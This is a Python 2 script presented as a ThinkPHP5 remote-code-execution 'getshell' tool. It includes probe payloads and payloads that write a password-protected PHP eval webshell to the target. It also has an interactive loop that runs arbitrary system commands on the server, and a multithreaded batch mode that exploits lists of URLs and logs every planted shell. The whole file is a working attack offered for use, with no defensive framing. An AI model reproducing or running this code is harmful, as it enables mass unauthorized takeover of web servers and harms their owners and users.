#coding:utf-8
#Author:LSA
#Description: thinkphp5 rce getshell
#Date:20181211

import requests
import optparse
import os
import datetime
import Queue
import threading
import sys
from bs4 import BeautifulSoup
from requests.packages import urllib3

reload(sys) 
sys.setdefaultencoding('utf-8')

lock = threading.Lock()

q0 = Queue.Queue()
threadList = []
global succ
succ = 0
headers = {}
headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'


poc0 = '/index.php/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
poc1 = '/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
poc2 = '/index.php/?s=index/\\think\Request/input&filter=phpinfo&data=1'
poc3 = '/index.php?s=/index/\\think\\request/cache&key=1|phpinfo'
poclist = [poc0,poc1,poc2,poc3]

exp0 = '/index.php/?s=index/\\think\\template\driver\\file/write&cacheFile=zxc0.php&content=<?php @eval($_POST[xxxxxx]);?>'
exp1 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[xxxxxx]);?>'
exp2 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[xxxxxx]);?>\'>zxc2.php'

explist = [exp0,exp1,exp2]

cmdtest = 'echo zxc000'
cmdexp0 = '/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[l][]={}'
cmdexp1 = '/index.php?s=index/\\think\Request/input&filter=system&data={}'
cmdexp2 = '/index.php?s=/index/\\think\\request/cache&key={}|system'
cmdexp3 = '/index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'

cmdlist = [cmdexp0,cmdexp1,cmdexp2,cmdexp3]



def tp5_getshell_check(tgtUrl,timeout):
	
	for p in range(len(poclist)):

	
		fullUrl = tgtUrl + poclist[p]
		#print fullUrl
		try:
			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
		except requests.exceptions.Timeout:
			print 'phpinfo checked fail! Error: Timeout'
			continue
		except requests.exceptions.ConnectionError:
			print 'phpinfo checked fail! Error: ConnectionError'
			continue
		except:
			print 'phpinfo checked fail! Error: Unkonwn error0'
			continue
		
		if rst.status_code == 200:
			
			if(rst.text.index('PHP Version')):
				print 'phpinfo checked success! poc'  + str(p) + ': ' + poclist[p] + '\n'

			else:
				soup = BeautifulSoup(rst.text,'lxml')
				if(soup.find('title')):
					print 'Poc' + str(p) + ' phpinfo checked fail! Error title: ' + str(soup.title.string) + '\n'
				else:
					print 'Poc' + str(p) + ' phpinfo checked fail! ' + str(rst.text[0:11]) + '\n'
	
		else:
			print 'Poc' + str(p) + ' phpinfo checked fail! status code: ' + str(rst.status_code) + '\n'
			continue
	
def tp5_getshell_cmdshell(tgtUrl,timeout):
	for c in range(len(cmdlist)):
		fullUrl = tgtUrl + cmdlist[c].format(cmdtest)
		#print fullUrl
		try:
			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
			#print rst.text
			
			if rst.status_code == 200:
				if 'zxc000' in rst.text:
					print 'Getshell cmd success! now use cmdexp'  + str(c) + ': ' + cmdlist[c] + '\n'
					while True:
						command = raw_input("cmd>>> ")
						if command == 'exit':
							break
							
						cmdexp = cmdlist[c].format(command)
						fullUrl1 = tgtUrl + cmdexp
						cmdResult = requests.get(fullUrl1,headers=headers,timeout=7)
						print cmdResult.text
					break
				
				else:
					print 'Cmdshell' + str(c) + ' checked fail! status code: ' + str(rst.status_code) + '\n'
					continue
				
			
		except requests.exceptions.Timeout:
			#print 'Getcmdshell fail! Error: Timeout'
			continue
		except requests.exceptions.ConnectionError:
			#print 'Getcmdshell fail! Error: ConnectionError'
			continue
		except:
			#print 'Getcmdshell fail! Error: Unkonwn error0'
			continue

		
	
	print 'Over'

def tp5_getshell_exploit(tgtUrl,timeout):
	
	for e in range(len(explist)):

		fullUrl = tgtUrl + explist[e]
		#print fullUrl
		try:
			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
		except requests.exceptions.Timeout:
			print 'Getshell exploited fail! Error: Timeout'
			continue
		except requests.exceptions.ConnectionError:
			print 'Getshell exploited fail! Error: ConnectionError'
			continue
		except:
			print 'Getshell exploited fail! Error: Unkonwn error0'
			continue
		
		if rst.status_code == 200:
			
			rst1 = requests.get(tgtUrl+'/zxc'+str(e)+'.php',timeout=timeout,verify=False)
			if rst1.status_code == 200:
				if rst1.text == '':
					print 'Getshell! ' + tgtUrl + '/zxc' + str(e) + '.php|pwd:xxxxxx' + '\n'
					exit()
				else:
					soup = BeautifulSoup(rst1.text,'lxml')
					if(soup.find('title')):
						print 'Exp' + str(e) + ' getshell exploited fail! Error title: ' + str(soup.title.string) + '\n'
					else:
						print 'Exp' + str(e) + ' getshell exploited fail! ' + str(rst1.text[0:11]) + '\n'
			else:
				
				print 'Exp' + str(e) + ' getshell exploited fail! Shell status code: ' + str(rst1.status_code) + '\n'
		else:
				
			print 'Exp' + str(e) + ' getshell exploited fail! status code: ' + str(rst.status_code) + '\n'


def tp5_getshell_batch(timeout,f4success):
	urllib3.disable_warnings()
	global countLines
	while(not q0.empty()):

		tgtUrl = q0.get()
		for e in range(len(explist)):
			
			fullUrl = tgtUrl + explist[e]
			#print fullUrl
			qcount = q0.qsize()
			print 'Checking: ' + fullUrl + '---[' +  str(countLines - qcount) + '/' + str(countLines) + ']'
		
			try:
				rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)

			except requests.exceptions.Timeout:
				#print 'Getshell failed! Error: Timeout'
	
				continue

			except requests.exceptions.ConnectionError:
				#print 'Getshell failed! Error: ConnectionError'
				
				continue

			except:
				#print 'Getshell failed! Error: Unkonwn error'
				
				continue

			if rst.status_code == 200:
				try:
					rst1 = requests.get(tgtUrl+'/zxc'+str(e)+'.php',timeout=timeout,verify=False)

					if rst1.status_code == 200:

					
						if rst1.text == '':
							shellAddr = tgtUrl + '/zxc' + str(e) + '.php|pwd:xxxxxx'
							print 'Getshell! ' + shellAddr
							lock.acquire()
							f4success.write('shell: '+shellAddr+'\n')
							lock.release()
							global succ
							succ = succ + 1
							break
						else:
							continue
					else:
				
						#errorState = 'Getshell failed! Error: zxc.php' + str(e) + ' ' + str(rst1.status_code)
						continue

				except requests.exceptions.Timeout:
					#print 'Getshell failed! Error: Timeout'
				
					continue

				except requests.exceptions.ConnectionError:
					#print 'Getshell failed! Error: ConnectionError'
				
					continue			

				except:
					#print 'Getshell failed! Error: Unkonwn error'
			
					continue			

		

			else:
				#print 'Getshell failed! status code: ' + str(rst.status_code)
				
				continue

	 


if __name__ == '__main__':

	print '''
		****************************************************
		*          thinkphp5 rce getshell(controller)      *
		*				      Coded by LSA *
		****************************************************
		'''
	
	parser = optparse.OptionParser('python %prog ' +'-h (manual)',version='%prog v1.0')

	parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

	parser.add_option('-f', dest='tgtUrlsPath', type ='string', help='urls filepath[exploit default]')
	
	parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
	
	parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

	#parser.add_option('--check', dest='check',action='store_true', help='check url but not exploit[default]')	

	parser.add_option('--exploit', dest='exploit',action='store_true', help='exploit url')	

	parser.add_option('--cmdshell', dest='cmdshell',action='store_true', help='cmd shell mode')

	(options, args) = parser.parse_args()
	
	#check = options.check
		
	exploit = options.exploit

	cmdshell = options.cmdshell
	
	timeout = options.timeout
	
	tgtUrl = options.tgtUrl

	if tgtUrl and (exploit is None and cmdshell is None):
		
		tp5_getshell_check(tgtUrl,timeout)

	if tgtUrl and exploit:
		
		tp5_getshell_exploit(tgtUrl,timeout)

	if tgtUrl and cmdshell:
		
		tp5_getshell_cmdshell(tgtUrl,timeout)
	
	
	if options.tgtUrlsPath:
		tgtFilePath = options.tgtUrlsPath
		threads = options.threads
		nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
		os.mkdir('batch_result/'+str(nowtime))
		f4success = open('batch_result/'+str(nowtime)+'/'+'success.txt','w')
		#f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
		urlsFile = open(tgtFilePath)
		global countLines
		countLines = len(open(tgtFilePath,'rU').readlines())

		print '===Total ' + str(countLines) + ' urls==='

		for urls in urlsFile:
			fullUrls = urls.strip()
			q0.put(fullUrls)
		for thread in range(threads):
			t = threading.Thread(target=tp5_getshell_batch,args=(timeout,f4success))
			t.start()
			threadList.append(t)
		for th in threadList:
			th.join()


		print '\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###'
		print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
		f4success.close()
		#f4fail.close()
